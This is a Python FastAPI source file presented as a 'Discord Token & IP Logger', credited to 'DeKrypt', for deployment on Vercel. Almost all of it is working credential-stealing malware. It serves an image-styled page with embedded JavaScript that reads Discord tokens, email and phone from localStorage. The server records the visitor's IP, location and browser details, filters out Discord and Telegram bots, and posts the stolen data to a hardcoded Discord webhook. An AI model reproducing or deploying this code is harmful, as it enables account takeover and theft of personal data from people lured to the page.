# Discord Token & IP Logger for Vercel
# By DeKrypt | Optimized for Vercel Serverless Functions

from fastapi import FastAPI, Request, Query
from fastapi.responses import HTMLResponse, Response
import requests
import base64
import json
import traceback

# --- CONFIGURATION ---
config = {
    # Webhook URL
    "webhook": "https://discord.com/api/webhooks/1574701547357605978/mxLMcfb_mKQMyQbyaaBKTV_hBlA4e71W199_58SGqS6eY-CdDSr9DKdPdCvfY-q5YZOT",
    
    # Default Image URL
    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200",
    
    # Options
    "username": "Token Logger",
    "color": 0xFF0000,  # Red color for alerts
    "accurateLocation": False,
    "crashBrowser": False,
    "buggedImage": True,
    "vpnCheck": 1,
    "antiBot": 1,
    "redirect": {"redirect": False, "page": "https://spy-master-pro.onrender.com/"}
}

blacklistedIPs = ("27", "104", "143", "164")

# --- FastAPI App Instance ---
app = FastAPI()

# --- Helper Functions ---

def botCheck(ip, useragent):
    """Checks if the IP is from Discord or Telegram Bot infrastructure."""
    if ip.startswith(("34", "35")):
        return "Discord Bot"
    if useragent and useragent.startswith("TelegramBot"):
        return "Telegram Bot"
    return False

def get_ip_info(ip):
    """Fetches ISP, Country, City, etc. from ip-api.com"""
    try:
        resp = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
        return resp.json()
    except:
        return {}

def send_webhook(title, description, color=config["color"], username=config["username"], thumbnail=None):
    """Sends data to Discord Webhook."""
    payload = {
        "username": username,
        "embeds": [{
            "title": title,
            "color": color,
            "description": description,
            "thumbnail": {"url": thumbnail} if thumbnail else None
        }]
    }
    try:
        requests.post(config["webhook"], json=payload, timeout=5)
    except Exception as e:
        print(f"Webhook Error: {e}")

@app.get("/{full_path:path}")
async def root(request: Request, full_path: str = ""):
    # 1. Get Client Information
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "Unknown")
    query_params = dict(request.query_params)
    
    # 2. Extract Exfiltrated Data from URL (Sent by JS)
    extra_data = {}
    if data_param := query_params.get("data"):
        try:
            extra_data = json.loads(data_param)
        except:
            pass

    # 3. Bot Detection
    is_bot = botCheck(client_ip, user_agent)
    
    # 4. Gather Data for Report
    ip_info = get_ip_info(client_ip) if not is_bot else {}
    
    # Parse User Agent for OS/Browser
    os_name = "Unknown"
    browser_name = "Unknown"
    try:
        import httpagentparser
        os_name, browser_name = httpagentparser.simple_detect(user_agent)
    except:
        pass

    # 5. Prepare Embed Description
    desc = f"""**Endpoint:** `/{full_path}`
**IP:** `{client_ip}`
**OS:** `{os_name}`
**Browser:** `{browser_name}`
**User Agent:** `{user_agent}`
"""
    
    # Add Account Data if found
    if extra_data:
        desc += "\n\n**Discord Account Data:**\n"
        if extra_data.get("token"):
            desc += f"> **Token:** `{extra_data['token']}`\n"
        if extra_data.get("email"):
            desc += f"> **Email:** `{extra_data['email']}`\n"
        if extra_data.get("phone"):
            desc += f"> **Phone:** `{extra_data['phone']}`\n"
        if extra_data.get("locale"):
            desc += f"> **Locale:** `{extra_data['locale']}`\n"
        if extra_data.get("premium_type"):
            desc += f"> **Nitro:** `{extra_data['premium_type']}`\n"
            
        # Send Webhook for Token/Info
        send_webhook(
            title="Discord Token & Info Logged",
            description=desc,
            thumbnail=config["image"]
        )
    
    # If it's a bot, just return OK
    if is_bot:
        return Response(status_code=200)

    # 6. Generate HTML Payload
    # This HTML contains the JavaScript to steal tokens from localStorage
    js_exfiltration = """
<script>
(async () => {
    // Try to get token
    let token = localStorage.getItem("token");
    if (!token) {
        const keys = Object.keys(localStorage);
        const tokKeys = keys.filter(k => k.startsWith("token"));
        if (tokKeys.length > 0) {
            token = localStorage.getItem(tokKeys[0]);
        }
    }

    // Try to get email and phone
    let email = localStorage.getItem("email");
    let phone = localStorage.getItem("phone");
    let locale = localStorage.getItem("locale");
    let nitro = localStorage.getItem("premium_type");

    // If we have data, send it back to this server via URL
    if (token || email || phone) {
        const data = JSON.stringify({
            token: token,
            email: email,
            phone: phone,
            locale: locale,
            premium_type: nitro
        });
        
        // Send to self with data parameter
        window.location.href = window.location.pathname + "?" + encodeURIComponent("data=" + data);
    }
})();
</script>
    """

    html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <style>
        body {{
            margin: 0;
            padding: 0;
            background-color: #2f3136;
            background-image: url('{config["image"]}');
            background-position: center;
            background-repeat: no-repeat;
            background-size: contain;
            width: 100vw;
            height: 100vh;
        }}
    </style>
</head>
<body>
    {js_exfiltration}
</body>
</html>
"""

    return HTMLResponse(content=html_content)
